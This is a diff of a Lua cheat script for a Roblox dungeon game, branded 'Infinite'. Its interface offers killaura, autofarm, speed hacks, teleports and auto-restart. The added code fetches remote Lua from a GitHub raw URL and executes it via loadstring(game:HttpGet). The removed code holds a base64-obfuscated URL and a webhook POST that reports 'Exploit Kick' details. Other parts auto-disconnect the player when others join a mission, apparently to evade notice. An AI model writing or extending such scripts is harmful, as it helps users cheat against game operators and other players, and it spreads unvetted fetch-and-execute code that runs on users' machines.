+    warn("ak (ActiveMission) chưa tồn tại, có thể đang ở menu.")
+end
+
+-- Nếu chưa thêm BossDoorTrigger thì kiểm tra định kỳ
+if not isBossDoorAdded then
+    task.spawn(function()
+        while true do
+            task.wait(1)
+            local missionObjects = workspace:FindFirstChild("MissionObjects")
+            if missionObjects then
+                local waveStartGate = missionObjects:FindFirstChild("WaveStartGate")
+                if waveStartGate then
+                    local timer = waveStartGate:FindFirstChild("MissionTimer")
+                    if timer and timer:FindFirstChild("SurfaceGui") then
+                        local title = timer.SurfaceGui:FindFirstChild("Title")
+                        if title and title:IsA("TextLabel") and title.Text == "FINAL FLOOR" then
+                            if not table.find(c3, "BossDoorTrigger") then
+                                table.insert(c3, "BossDoorTrigger")
+                                isBossDoorAdded = true
+                                print("Đã thêm BossDoorTrigger do FINAL FLOOR.")
+                                ProcessAllTouchInterests()
+                                break
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end)
+end
+
+
+
+local c4 = {'Scarecrow1', 'Scarecrow2', 'Scarecrow3'}
+local c5 = {
     DireProblem = {
         Id = 2,
         ignoreMob = 'BOSSDireBoarwolf'
@@ -508,7 +671,11 @@ local c2 = {
         Id = 4,
         ignoreMob = 'BOSSKingCrab'
     },
-    GravetowerDungeon = {
+    GravetowerDungeon = a_('Demon') and {
+        Id = 6,
+        ignoreMob = 'BOSSTreeEnt',
+        mobWaitTime = 3
+    } or {
         Id = 6,
         priorityTbl = {'Pillar', 'BOSSTreeEnt'},
         mobWaitTbl = {'BOSSTreeEnt'},
@@ -545,6 +712,11 @@ local c2 = {
         Id = 44,
         priorityTbl = {'EVENTBOSSVane'}
     },
+    AetherTower = {
+        Id = 34,
+        priorityTbl = {'ForestMoose','ForestRaptor', 'VaneAetherDragon'},
+        clearMobsFirst = true  -- Biến cờ mới
+    },
     ArcaneTower = {
         Id = 43,
         priorityTbl = {'Crystal', 'BOSSKandrix'}
@@ -563,8 +735,8 @@ local c2 = {
         priorityTbl = {'Model', 'BOSSHogRider'}
     }
 }
-local c3 = 15;
-local c4 = {
+local c6 = 15;
+local c7 = {
     World1 = {
         Name = 'World 1',
         Id = 13,
@@ -641,9 +813,9 @@ local c4 = {
         OrderId = 15
     }
 }
-local c5 = {1, 3, 2, 4, 6, 11, 12, 13, 7, 14, 15, 16, 20, 19, 18, 24, 35, 21, 25, 36, 23, 26, 37, 27, 30, 31, 29, 32,
+local c8 = {1, 3, 2, 4, 6, 11, 12, 13, 7, 14, 15, 16, 20, 19, 18, 24, 35, 21, 25, 36, 23, 26, 37, 27, 30, 31, 29, 32,
             33, 34, 41, 42, 43, 39, 1005, 1006, 1007, 38}
-local c6 = {{
+local c9 = {{
     Id = 1,
     Name = "Crabby Crusade",
     World = 1,
@@ -880,6 +1052,14 @@ local c6 = {{
     Type = 'Raid',
     Special = true,
     Code = 'Event Raid'
+    
+}, {
+    Id = 46,
+    Name = "Cradle Of Hearts",
+    Type = 'Raid',
+    Special = true,
+    Code = 'Event Raid'
+    
 }, {
     Id = 45,
     Name = "The Depths",
@@ -887,30 +1067,7 @@ local c6 = {{
     Special = true,
     Code = 'Event Raid'
 }}
-local function c7(C)
-    local c8 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-    C = C:gsub('[^' .. c8 .. '=]', '')
-    return C:gsub('.', function(c9)
-        if c9 == '=' then
-            return ''
-        end
-        local ca, cb = '', c8:find(c9) - 1;
-        for K = 6, 1, -1 do
-            ca = ca .. (cb % 2 ^ K - cb % 2 ^ (K - 1) > 0 and '1' or '0')
-        end
-        return ca
-    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(c9)
-        if #c9 ~= 8 then
-            return ''
-        end
-        local cc = 0;
-        for K = 1, 8 do
-            cc = cc + (c9:sub(K, K) == '1' and 2 ^ (8 - K) or 0)
-        end
-        return string.char(cc)
-    end)
-end
-local cd = {
+local ca = {
     Assassin = {
         DisplayName = 'Shadowblade',
         Range = 10.5,
@@ -954,11 +1111,11 @@ local cd = {
             Cooldown = 6.1,
             Range = 59
         }, {
-            Skill = b6:WaitForChild('Assassin'):WaitForChild('EventStealthWalk'),
+            Skill = b2:WaitForChild('Assassin'):WaitForChild('EventStealthWalk'),
             Cooldown = 0.25,
             Type = 'Remote'
         }, {
-            Skill = b6:WaitForChild('Assassin'):WaitForChild('Ultimate'),
+            Skill = b2:WaitForChild('Assassin'):WaitForChild('Ultimate'),
             Cooldown = 1,
             Type = 'Remote'
         }, {
@@ -1011,16 +1168,16 @@ local cd = {
             Skill = 'MageOfLightBlastCharged',
             Cooldown = 0.33
         }, {
-            Skill = b6:WaitForChild('MageOfLight'):WaitForChild('HealCircle'),
+            Skill = b2:WaitForChild('MageOfLight'):WaitForChild('HealCircle'),
             Cooldown = 14.2,
             Type = 'Heal'
         }, {
-            Skill = b6:WaitForChild('MageOfLight'):WaitForChild('Barrier'),
+            Skill = b2:WaitForChild('MageOfLight'):WaitForChild('Barrier'),
             Args = c,
             Cooldown = 15.2,
             Type = 'Heal'
         }, {
-            Skill = b6:WaitForChild('MageOfLight'):WaitForChild('Ultimate'),
+            Skill = b2:WaitForChild('MageOfLight'):WaitForChild('Ultimate'),
             Cooldown = 1,
             Type = 'Heal'
         }}
@@ -1155,7 +1312,7 @@ local cd = {
             Cooldown = 9,
             Range = 19
         }, {
-            Skill = b6:WaitForChild('Paladin'):WaitForChild('GuildedLight'),
+            Skill = b2:WaitForChild('Paladin'):WaitForChild('GuildedLight'),
             Cooldown = 15.2,
             Type = 'Heal'
         }}
@@ -1268,7 +1425,7 @@ local cd = {
             Cooldown = 10.2,
             Range = 9
         }, {
-            Skill = b6:WaitForChild('Berserker'):WaitForChild('Ultimate'),
+            Skill = b2:WaitForChild('Berserker'):WaitForChild('Ultimate'),
             Cooldown = 1,
             Type = 'Remote'
         }}
@@ -1346,7 +1503,7 @@ local cd = {
             Range = 44,
             Type = 'Ranged'
         }, {
-            Skill = b6:WaitForChild('Guardian'):WaitForChild('AggroDraw'),
+            Skill = b2:WaitForChild('Guardian'):WaitForChild('AggroDraw'),
             Cooldown = 14.5,
             Type = 'Remote'
         }, {
@@ -1594,7 +1751,7 @@ local cd = {
             Type = 'Ranged',
             Range = 56
         }, {
-            Skill = b6:WaitForChild('Demon'):WaitForChild('Ultimate'),
+            Skill = b2:WaitForChild('Demon'):WaitForChild('Ultimate'),
             Cooldown = 1,
             Type = 'Remote'
         }, {
@@ -1809,7 +1966,7 @@ local cd = {
             Skill = 'DualWield10',
             Cooldown = 0.75
         }, {
-            Skill = b6:WaitForChild('DualWielder'):WaitForChild('AttackBuff'),
+            Skill = b2:WaitForChild('DualWielder'):WaitForChild('AttackBuff'),
             Cooldown = 12.2,
             Type = 'Remote'
         }, {
@@ -1866,7 +2023,7 @@ local cd = {
             Type = 'Ranged',
             Range = 47
         }, {
-            Skill = b6:WaitForChild('DualWielder'):WaitForChild('Ultimate'),
+            Skill = b2:WaitForChild('DualWielder'):WaitForChild('Ultimate'),
             Cooldown = 31,
             Type = 'Remote'
         }, {
@@ -2216,7 +2373,7 @@ local cd = {
             Cooldown = 8.2,
             Range = 5
         }, {
-            Skill = b6:WaitForChild('Dragoon'):WaitForChild('Ultimate'),
+            Skill = b2:WaitForChild('Dragoon'):WaitForChild('Ultimate'),
             Cooldown = 1,
             Type = 'Remote'
         }, {
@@ -2446,17 +2603,17 @@ local cd = {
             Type = 'Melee',
             Range = 21
         }, {
-            Skill = b6:WaitForChild('Summoner'):WaitForChild('SoulHarvest'),
+            Skill = b2:WaitForChild('Summoner'):WaitForChild('SoulHarvest'),
             Cooldown = 10.2,
             Type = 'Remote',
             Args = "MobPosition",
             Range = 39
         }, {
-            Skill = b6:WaitForChild('Summoner'):WaitForChild('Summon'),
+            Skill = b2:WaitForChild('Summoner'):WaitForChild('Summon'),
             Cooldown = 0.5,
             Type = 'Remote'
         }, {
-            Skill = b6:WaitForChild('Summoner'):WaitForChild('Ultimate'),
+            Skill = b2:WaitForChild('Summoner'):WaitForChild('Ultimate'),
             Cooldown = 1,
             Type = 'Remote'
         }}
@@ -2574,7 +2731,7 @@ local cd = {
             Range = 98,
             Type = 'Ranged'
         }, {
-            Skill = b6:WaitForChild('Necromancer'):WaitForChild('Ultimate'),
+            Skill = b2:WaitForChild('Necromancer'):WaitForChild('Ultimate'),
             Cooldown = 31,
             Type = 'Remote'
         }}
@@ -2609,12 +2766,12 @@ local cd = {
             Skill = 'MageOfShadowsDamageCircle',
             Cooldown = 0.33
         }, {
-            Skill = b6:WaitForChild('MageOfShadows'):WaitForChild('ShadowChains'),
+            Skill = b2:WaitForChild('MageOfShadows'):WaitForChild('ShadowChains'),
             Cooldown = 6,
             Type = 'Remote',
             Args = 'mobTbl'
         }, {
-            Skill = b6:WaitForChild('MageOfShadows'):WaitForChild('Ultimate'),
+            Skill = b2:WaitForChild('MageOfShadows'):WaitForChild('Ultimate'),
             Cooldown = 2,
             Type = 'Remote'
         }}
@@ -2628,1788 +2785,1782 @@ local cd = {
             Skill = 'Hunter',
             Cooldown = 0.5
         }}
-    },
-    Stormcaller = {
-        DisplayName = 'Stormcaller',
-        Range = 99,
-        Type = 'Ranged',
-        Primary = 'Staff',
-        Skills = {{
-            Skill = 'Stormcaller1',
-            Cooldown = 0.3
-        }, {
-            Skill = 'Stormcaller2',
-            Cooldown = 0.3
-        }, {
-            Skill = 'Stormcaller3',
-            Cooldown = 0.3
-        }, {
-            Skill = 'StormcallerThunderGod1',
-            Cooldown = 0.25,
-            Type = 'Melee',
-            Range = 13
-        }, {
-            Skill = 'StormcallerThunderGod2',
-            Cooldown = 0.5,
-            Type = 'Melee',
-            Range = 13
-        }, {
-            Skill = 'StormcallerThunderGod3',
-            Cooldown = 0.75,
-            Type = 'Melee',
-            Range = 13
-        }, {
-            Skill = 'StormcallerThunderGod4',
-            Cooldown = 1,
-            Type = 'Melee',
-            Range = 13
-        }, {
-            Skill = 'StormcallerThunderGod5',
-            Cooldown = 1.25,
-            Type = 'Melee',
-            Range = 13
-        }, {
-            Skill = 'StormcallerThunderGod6',
-            Cooldown = 1.6,
-            Type = 'Melee',
-            Range = 13
-        }, {
-            Skill = 'StormcallerThunderGod7',
-            Cooldown = 2,
-            Type = 'Melee',
-            Range = 13
-        }, {
-            Skill = 'StormcallerThunderGod8',
-            Cooldown = 2.3,
-            Type = 'Melee',
-            Range = 13
-        }, {
-            Skill = 'UltimateDischarge',
-            Cooldown = 1.6,
-            Range = 39
-        }, {
-            Skill = 'ChainLightning1',
-            Cooldown = 7.1,
-            Range = 119
-        }, {
-            Skill = 'ChainLightning2',
-            Cooldown = 7.1,
-            Range = 119
-        }, {
-            Skill = 'ChainLightning3',
-            Cooldown = 7.1,
-            Range = 119
-        }, {
-            Skill = 'ChainLightning4',
-            Cooldown = 7.1,
-            Range = 119
-        }, {
-            Skill = 'ChainLightning5',
-            Cooldown = 7.1,
-            Range = 119
-        }, {
-            Skill = 'ChainLightning6',
-            Cooldown = 7.1,
-            Range = 119
-        }, {
-            Skill = 'ChainLightning7',
-            Cooldown = 7.1,
-            Range = 119
-        }, {
-            Skill = 'ChainLightning8',
-            Cooldown = 7.1,
-            Range = 119
-        }, {
-            Skill = 'StormSurgeInit',
-            Cooldown = 10.1,
-            Range = 19.5
-        }, {
-            Skill = 'StormSurge',
-            Cooldown = 10.1,
-            Range = 39.5
-        }, {
-            Skill = 'StormcallerUltBlast',
-            Cooldown = 31,
-            Range = 10
-        }}
     }
 }
-bY = c7('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JvbmFsZGJ1cmdlcnNvbi9ib3JnL21haW4vYnJvb20=')
-local ce = Instance.new('Folder')
-ce.Name = 'SummonFolder'
-ce.Parent = Workspace;
-local cf = Instance.new('Folder')
-cf.Name = 'infiniteboy'
-cf.Parent = Workspace;
-local cg;
-if aD then
-    cg = Instance.new('Part')
-    cg.Name = 'InfiniteKillPart'
-    cg.Size = Vector3.new(50, 20, 50)
-    cg.Position = Vector3.new(10000, 10000, 10000)
-    cg.Anchored = true;
-    cg.Transparency = 0;
-    cg.Material = 'SmoothPlastic'
-    cg.BrickColor = BrickColor.new('Cyan')
-    cg.Parent = workspace
+local cb = Instance.new('Folder')
+cb.Name = 'SummonFolder'
+cb.Parent = Workspace;
+local cc = Instance.new('Folder')
+cc.Name = 'infiniteboy'
+cc.Parent = Workspace;
+local cd;
+if av then
+    cd = Instance.new('Part')
+    cd.Name = 'InfiniteKillPart'
+    cd.Size = Vector3.new(50, 20, 50)
+    cd.Position = Vector3.new(10000, 10000, 10000)
+    cd.Anchored = true;
+    cd.Transparency = 0;
+    cd.Material = 'SmoothPlastic'
+    cd.BrickColor = BrickColor.new('Cyan')
+    cd.Parent = workspace
 end
-local ch;
-local ci;
-local cj;
-ch, cj, ci = bC(bX .. n .. k .. bW .. l .. bY .. bZ .. m)
+local ce = 'https://raw.githubusercontent.com/maihoangphi2531/infscriptv2/main/'
+local cf;
+local cg;
+if a4 then
+    local function ch(ci, cj)
+        local ck, cl = pcall(function()
+            return readfile(cj)
+        end)
+        if ck and not UpdateLib then
+            return loadstring(cl)()
+        else
+            cl = game:HttpGet(ci)
+            writefile(cj, cl)
+            return loadstring(cl)()
+        end
+    end
+    bk = ch(ce .. 'Linoria', 'LinoriaV6.lua')
+    cf = ch(ce .. 'LinoriaThemeManager', 'LinoriaThemeManagerV5.lua')
+    cg = ch(ce .. 'LinoriaSaveManager', 'LinoriaSaveManagerV5.lua')
+else
+    bk = loadstring(game:HttpGet(ce .. 'Linoria'))()
+    cf = loadstring(game:HttpGet(ce .. 'LinoriaThemeManager'))()
+    cg = loadstring(game:HttpGet(ce .. 'LinoriaSaveManager'))()
+end
 a = true;
-function libWarn(msg)
+local function cm(msg)
     warn('[Infinite]: ' .. msg)
 end
-function pcallWithError(ck)
-    local bw, cl = pcall(ck)
-    if not bw and cl then
-        libWarn(cl)
+local function cn(co)
+    local bw, cp = pcall(co)
+    if not bw and cp then
+        cm(cp)
     end
 end
-function libNoti(msg)
+local function cq(msg)
     print(msg)
-    pcallWithError(function()
-        ch:Notify(msg)
+    cn(function()
+        bk:Notify(msg)
     end)
 end
-function setMissionObjective(cm, cn)
-    local P = c.PlayerGui.MissionObjective.MissionObjective.Label;
-    P.Text = cm;
-    P.Overlay.Text = cm;
-    if cn then
-        P.ZIndex = 30;
-        P.Overlay.ZIndex = 31
+local function cr(cs, ct)
+    local H = c.PlayerGui.MissionObjective.MissionObjective.Label;
+    H.Text = cs;
+    H.Overlay.Text = cs;
+    if ct then
+        H.ZIndex = 30;
+        H.Overlay.ZIndex = 31
     end
 end
-function resetMissionObjective()
-    local P = c.PlayerGui.MissionObjective.MissionObjective.Label;
-    P.Text = ''
-    P.Overlay.Text = ''
+local function cu()
+    local H = c.PlayerGui.MissionObjective.MissionObjective.Label;
+    H.Text = ''
+    H.Overlay.Text = ''
 end
-function isRangedClass()
-    return cd[b3] and cd[b3].Type == 'Ranged'
+local function cv()
+    return ca[aZ] and ca[aZ].Type == 'Ranged'
 end
-local co = game:GetService('GuiService')
-local cp;
-cp = co.ErrorMessageChanged:Connect(function(msg)
-    if co:GetErrorCode() == Enum.ConnectionError.DisconnectLuaKick or co:GetErrorCode() ==
-        Enum.ConnectionError.DisconnectConnectionLost or msg:lower():find("exploit") then
-        cp:Disconnect()
-        ai.Kicked = true;
-        save()
-        if msg:lower():find("exploit") then
-            local cq = 'Killaura Delay: ``' .. Options.KillauraDelay.Value .. '``\nClass: ``' .. cd[b3].DisplayName ..
-                           '``\nPing: ``' .. ping2() .. '``'
-            if aw then
-                cq = cq .. '\nCode: ``' .. i .. '``\nMission: ``' .. h .. '``'
-            end
-            cq = cq .. '\n' .. f;
-            request({
-                Url = boink2,
-                Method = "POST",
-                Headers = {
-                    ["Content-Type"] = "application/json"
-                },
-                Body = e:JSONEncode({
-                    ["embeds"] = {{
-                        ["title"] = 'Exploit Kick',
-                        ["description"] = cq,
-                        ["type"] = 'rich',
-                        ["color"] = tonumber(v.LightPink),
-                        ["footer"] = {
-                            ["text"] = utcDateAndTime() .. ' UTC'
-                        }
-                    }}
-                })
-            })
-        end
-        a0:Teleport(ah, c)
-    end
-end)
-local cr = ch:CreateWindow({
-    Title = ' ' .. defniwndwodnwod,
-    Resizable = true,
+local cw = game:GetService('GuiService')
+local cx;
+
+local cz = bk:CreateWindow({
+    Title = bausha,
     Center = false,
     AutoShow = true,
     TabPadding = 8,
-    MenuFadeTime = 0,
-    CornerRadius = 15
+    MenuFadeTime = 0
 })
-local cs = {
-    Main = cr:AddTab('Main'),
-    Sell = cr:AddTab('Sell'),
-    Teleports = cr:AddTab('Teleports'),
-    ['Settings'] = cr:AddTab('Settings')
+local cA = {
+    Main = cz:AddTab('Main'),
+    Sell = cz:AddTab('Sell'),
+    Teleports = cz:AddTab('Teleports'),
+    ['Settings'] = cz:AddTab('Settings')
 }
-local ct = cs.Main:AddLeftTabbox('farmmm')
-local cu = cs.Sell:AddLeftTabbox('selll')
-local cv = cs.Sell:AddRightTabbox('selll2')
-local cw = ct:AddTab('Farm')
-local cx = ct:AddTab('Settings')
-local cy = cu:AddTab('Auto Sell')
-local cz = cv:AddTab('Sell/Recycle Cosmetics')
-local cA = ct:AddTab('Weapons')
-local cB = ct:AddTab('Event')
-local cC = cs.Main:AddRightTabbox('box')
-local cD = cC:AddTab('Visual')
-local cE = cC:AddTab('Webhook')
-local cF = cC:AddTab('Misc')
-local cG = cC:AddTab('Gui')
-local cH = cs.Main:AddRightTabbox('temp')
-local cI = cH:AddTab('Stats')
-local cJ = cs.Teleports:AddLeftGroupbox('Worlds')
-local cK = cs.Teleports:AddRightGroupbox('Towers')
-local cL = cs.Teleports:AddRightGroupbox('Nightmare Dungeons')
-cw:AddToggle('Killaura', {
-    Text = 'Killaura',
-    Default = false
-})
-cw:AddSlider('KillauraDelay', {
-    Text = 'Delay',
-    Default = 0,
-    Min = 0,
-    Max = 1,
-    Rounding = 2,
-    HideMax = true,
-    Compact = true
-})
-cw:AddToggle('Autofarm', {
-    Text = 'Autofarm',
-    Default = false
-})
-cw:AddSlider('Offset', {
-    Text = 'Offset',
-    Default = isRangedClass() and 50 or 6,
-    Min = 0,
-    Max = aw and (isRangedClass() and 75 or 25) or 75,
-    Rounding = 1,
-    Compact = true
-})
-cw:AddSlider('healPercent', {
-    Text = 'Heal At',
-    Default = 30,
-    Min = 0,
-    Max = 100,
-    Rounding = 0,
-    HideMax = true,
-    Compact = true,
-    Suffix = '% HP'
-})
-cw:AddSlider('resumePercent', {
-    Text = 'Resume At',
-    Default = 100,
-    Min = 0,
-    Max = 100,
-    Rounding = 0,
-    HideMax = true,
-    Compact = true,
-    Suffix = '% HP'
-})
-cw:AddToggle('CollectDrops', {
-    Text = 'Collect Drops',
-    Default = false
-})
-cw:AddToggle('RestartDungeon', {
-    Text = 'Restart Dungeon',
-    Default = false
-})
-cw:AddToggle('nightmareLoop', {
-    Text = 'Nightmare Loop',
-    Default = false
-})
-cw:AddToggle('NextDungeon', {
-    Text = 'Next Dungeon',
-    Default = false
-})
-cw:AddToggle('PerkSwitcher', {
-    Text = 'Auto Switch Perks',
-    Default = false,
-    Tooltip = 'Enables Primary Perks on Mobs, and Offhand Perks on Bosses'
-})
-cw:AddToggle('autoEquipBestwWep', {
-    Text = 'Auto Equip Best Weapon/Armor',
-    Default = false
-})
-cw:AddToggle('mobCamera', {
-    Text = 'Mob POV',
-    Default = false
-})
-cw:AddSlider('FastSprint', {
-    Text = 'Sprint Speed',
-    Default = 28,
-    Min = 28,
-    Max = 200,
-    Rounding = 0,
-    Compact = true
-})
-cw:AddButton({
-    Text = 'Restart Dungeon',
-    Func = function()
-        if aw then
-            StartRaid(as, at)
+local cB = cA.Main:AddLeftTabbox('farmmm')
+local cC = cA.Sell:AddLeftTabbox('selll')
+local cD = cA.Sell:AddRightTabbox('selll2')
+local cE = cB:AddTab('Farm')
+local cF = cB:AddTab('Settings')
+local cG = cC:AddTab('Auto Sell')
+local cH = cD:AddTab('Sell/Recycle Cosmetics')
+local cI = cB:AddTab('Weapons')
+local cJ = cB:AddTab('Event')
+local cK = cA.Main:AddRightTabbox('box')
+local cL = cK:AddTab('Visual')
+local cM = cK:AddTab('Webhook')
+local cN = cK:AddTab('Misc')
+local cO = cK:AddTab('Gui')
+local cP = cA.Main:AddRightTabbox('temp')
+local cQ = cP:AddTab('Stats')
+local cR = cA.Teleports:AddLeftGroupbox('Worlds')
+local cS = cA.Teleports:AddRightGroupbox('Towers')
+local cT = cA.Teleports:AddRightGroupbox('Nightmare Dungeons')
+do
+    cE:AddToggle('Killaura', {
+        Text = 'Killaura',
+        Default = false
+    })
+    cE:AddSlider('KillauraDelay', {
+        Text = 'Delay',
+        Default = 0,
+        Min = 0,
+        Max = 1,
+        Rounding = 2,
+        HideMax = true,
+        Compact = true
+    })
+    cE:AddToggle('Autofarm', {
+        Text = 'Autofarm',
+        Default = false
+    })
+    cE:AddSlider('Offset', {
+        Text = 'Offset',
+        Default = cv() and 50 or 6,
+        Min = 0,
+        Max = ao and (cv() and 75 or 25) or 75,
+        Rounding = 1,
+        Compact = true
+    })
+    cE:AddSlider('healPercent', {
+        Text = 'Heal At',
+        Default = 30,
+        Min = 0,
+        Max = 100,
+        Rounding = 0,
+        HideMax = true,
+        Compact = true,
+        Suffix = '% HP'
+    })
+    cE:AddSlider('resumePercent', {
+        Text = 'Resume At',
+        Default = 100,
+        Min = 0,
+        Max = 100,
+        Rounding = 0,
+        HideMax = true,
+        Compact = true,
+        Suffix = '% HP'
+    })
+    cE:AddToggle('CollectDrops', {
+        Text = 'Collect Drops',
+        Default = false
+    })
+    cE:AddToggle('RestartDungeon', {
+        Text = 'Restart Dungeon',
+        Default = false
+    })
+    cE:AddToggle('nightmareLoop', {
+        Text = 'Nightmare Loop',
+        Default = false
+    })
+    cE:AddToggle('NextDungeon', {
+        Text = 'Next Dungeon',
+        Default = false
+    })
+    cE:AddToggle('PerkSwitcher', {
+        Text = 'Auto Switch Perks',
+        Default = false,
+        Tooltip = 'Enables Primary Perks on Mobs, and Offhand Perks on Bosses'
+    })
+    cE:AddToggle('autoEquipBestwWep', {
+        Text = 'Auto Equip Best Weapon/Armor',
+        Default = false
+    })
+    cE:AddToggle('mobCamera', {
+        Text = 'Mob POV',
+        Default = false
+    })
+    cE:AddSlider('FastSprint', {
+        Text = 'Sprint Speed',
+        Default = 28,
+        Min = 28,
+        Max = 200,
+        Rounding = 0,
+        Compact = true
+    })
+    cE:AddButton({
+        Text = 'Restart Dungeon',
+        Func = function()
+            if ao then
+                StartRaid(ak, al)
+            end
+        end,
+        DoubleClick = false
+    })
+    cF:AddSlider('dungeonRestartTimer', {
+        Text = 'Restart Dungeon Delay',
+        Default = 0,
+        Min = 0,
+        Max = 600,
+        Rounding = 0,
+        HideMax = true,
+        Suffix = ' seconds',
+        Compact = true
+    })
+    cF:AddSlider('towerRestartTimer', {
+        Text = 'Restart Tower Delay',
+        Default = 0,
+        Min = 0,
+        Max = 30,
+        Rounding = 0,
+        HideMax = true,
+        Suffix = ' seconds',
+        Compact = true
+    })
+    cF:AddSlider('dungeonStartTimer', {
+        Text = 'Dungeon Start Delay',
+        Default = 0,
+        Min = 0,
+        Max = 600,
+        Rounding = 0,
+        HideMax = true,
+        Suffix = ' seconds',
+        Compact = true
+    })
+    cF:AddSlider('towerStartTimer', {
+        Text = 'Tower Start Delay',
+        Default = 0,
+        Min = 0,
+        Max = 600,
+        Rounding = 0,
+        HideMax = true,
+        Suffix = ' seconds',
+        Compact = true
+    })
+    Options.dungeonStartTimer:OnChanged(function(cU)
+        bh = bh + 1
+    end)
+    Options.towerStartTimer:OnChanged(function(cU)
+        bi = bi + 1
+    end)
+    cF:AddSlider('timeoutTimer', {
+        Text = 'Dungeon Timeout',
+        Default = 2000000000,
+        Min = 10,
+        Max = 2000000000000,
+        Rounding = 0,
+        HideMax = true,
+        Suffix = ' seconds',
+        Tooltip = 'Restart dungeon if no damage has been done within the specified time period',
+        Compact = true
+    })
+    cF:AddToggle('restartAfterFloors', {
+        Text = 'Inf Tower Smart Restart',
+        Tooltip = 'Restarts Infinite Floor after specified amount of floors are completed',
+        Default = false
+    })
+    cF:AddInput('completedInfiniteTowerFloors', {
+        Text = 'Floors',
+        Default = 31,
+        Numeric = true,
+        Finished = true
+    })
+    cF:AddToggle('ignoreCannon', {
+        Text = 'Ignore Cannon (Atlantis Tower)',
+        Default = false
+    })
+    cF:AddToggle('skipScarecrowNm', {
+        Text = 'Skip Scarecrow Defense (NM Loop)',
+        Default = false
+    })
+    cF:AddToggle('rejoinDungeon', {
+        Text = 'Rejoin Last Dungeon',
+        Tooltip = 'Automatically starts the last dungeon started within your desired time limit',
+        Default = false
+    })
+    Toggles.rejoinDungeon:OnChanged(function(cV)
+        aa.RejoinLastDungeon = cV;
+        save()
+    end)
+    local cW = {
+        ['30 minutes'] = 1800,
+        ['3 hours'] = 10800,
+        ['12 hours'] = 43200,
+        ['24 hours'] = 86400,
+        ['Infinite'] = 999999999
+    }
+    cF:AddDropdown('rjdLimit', {
+        Text = 'Rejoin Last Dungeon Limit',
+        Values = {'30 minutes', '3 hours', '12 hours', '24 hours', 'Infinite'},
+        Default = '30 minutes',
+        AllowNull = false,
+        Multi = false
+    })
+    Options.rjdLimit:OnChanged(function(cV)
+        aa.RejoinLastDungeonThreshold = cW[cV]
+        save()
+    end)
+    cF:AddToggle('forceRestartLastTower', {
+        Text = 'Force Restart Last Tower',
+        Tooltip = 'Restart the Tower when going back to town (willingly or by force)',
+        Default = false
+    })
+    Toggles.forceRestartLastTower:OnChanged(function(cV)
+        aa.ForceRestartLastTower = cV;
+        save()
+    end)
+    cF:AddSlider('playerCountKick', {
+        Text = 'Mission PlayerCount Kick',
+        Default = 6,
+        Min = 2,
+        Max = 6,
+        Rounding = 0,
+        HideMax = true,
+        Tooltip = 'Disconnect from the game if player count reaches the threshold in mission',
+        Compact = true
+    })
+    task.spawn(function()
+        while ao do
+            if #b:GetPlayers() >= Options.playerCountKick.Value then
+                task.wait(0.5)
+                c:Kick('Someone might have joined your mission!')
+                break
+            end
+            task.wait()
         end
-    end,
-    DoubleClick = false
-})
-cx:AddSlider('dungeonRestartTimer', {
-    Text = 'Restart Dungeon Delay',
-    Default = 0,
-    Min = 0,
-    Max = 300,
-    Rounding = 0,
-    HideMax = true,
-    Suffix = ' seconds',
-    Compact = true
-})
-cx:AddSlider('towerRestartTimer', {
-    Text = 'Restart Tower Delay',
-    Default = 0,
-    Min = 0,
-    Max = 30,
-    Rounding = 0,
-    HideMax = true,
-    Suffix = ' seconds',
-    Compact = true
-})
-cx:AddSlider('dungeonStartTimer', {
-    Text = 'Dungeon Start Delay',
-    Default = 0,
-    Min = 0,
-    Max = 300,
-    Rounding = 0,
-    HideMax = true,
-    Suffix = ' seconds',
-    Compact = true
-})
-cx:AddSlider('towerStartTimer', {
-    Text = 'Tower Start Delay',
-    Default = 0,
-    Min = 0,
-    Max = 600,
-    Rounding = 0,
-    HideMax = true,
-    Suffix = ' seconds',
-    Compact = true
-})
-Options.dungeonStartTimer:OnChanged(function(cM)
-    bk = bk + 1
-end)
-Options.towerStartTimer:OnChanged(function(cM)
-    bl = bl + 1
-end)
-cx:AddSlider('timeoutTimer', {
-    Text = 'Dungeon Timeout',
-    Default = 120,
-    Min = 10,
-    Max = 300,
-    Rounding = 0,
-    HideMax = true,
-    Suffix = ' seconds',
-    Tooltip = 'Restart dungeon if no damage has been done within the specified time period',
-    Compact = true
-})
-cx:AddToggle('restartAfterFloors', {
-    Text = 'Inf Tower Smart Restart',
-    Tooltip = 'Restarts Infinite Floor after specified amount of floors are completed',
-    Default = false
-})
-cx:AddInput('completedInfiniteTowerFloors', {
-    Text = 'Floors',
-    Default = 31,
-    Numeric = true,
-    Finished = true
-})
-cx:AddToggle('ignoreCannon', {
-    Text = 'Ignore Cannon (Atlantis Tower)',
-    Default = false
-})
-cx:AddToggle('skipScarecrowNm', {
-    Text = 'Skip Scarecrow Defense (NM Loop)',
-    Default = false
-})
-cx:AddToggle('rejoinDungeon', {
-    Text = 'Rejoin Last Dungeon',
-    Tooltip = 'Automatically starts the last dungeon started within your desired time limit',
-    Default = false
-})
-Toggles.rejoinDungeon:OnChanged(function(cc)
-    ai.RejoinLastDungeon = cc;
-    save()
-end)
-local cN = {
-    ['30 minutes'] = 1800,
-    ['3 hours'] = 10800,
-    ['12 hours'] = 43200,
-    ['24 hours'] = 86400,
-    ['Infinite'] = 999999999
-}
-cx:AddDropdown('rjdLimit', {
-    Text = 'Rejoin Last Dungeon Limit',
-    Values = {'30 minutes', '3 hours', '12 hours', '24 hours', 'Infinite'},
-    Default = '30 minutes',
-    AllowNull = false,
-    Multi = false
-})
-Options.rjdLimit:OnChanged(function(cc)
-    ai.RejoinLastDungeonThreshold = cN[cc]
-    save()
-end)
-cx:AddToggle('forceRestartLastTower', {
-    Text = 'Force Restart Last Tower',
-    Tooltip = 'Restart the Tower when going back to town (willingly or by force)',
-    Default = false
-})
-Toggles.forceRestartLastTower:OnChanged(function(cc)
-    ai.ForceRestartLastTower = cc;
-    save()
-end)
-cx:AddSlider('playerCountKick', {
-    Text = 'Mission PlayerCount Kick',
-    Default = 6,
-    Min = 2,
-    Max = 6,
-    Rounding = 0,
-    HideMax = true,
-    Tooltip = 'Disconnect from the game if player count reaches the threshold in mission',
-    Compact = true
-})
-task.spawn(function()
-    while aw do
-        if #b:GetPlayers() >= Options.playerCountKick.Value then
-            task.wait(0.5)
-            c:Kick('Someone might have joined your mission!')
-            break
-        end
-        task.wait()
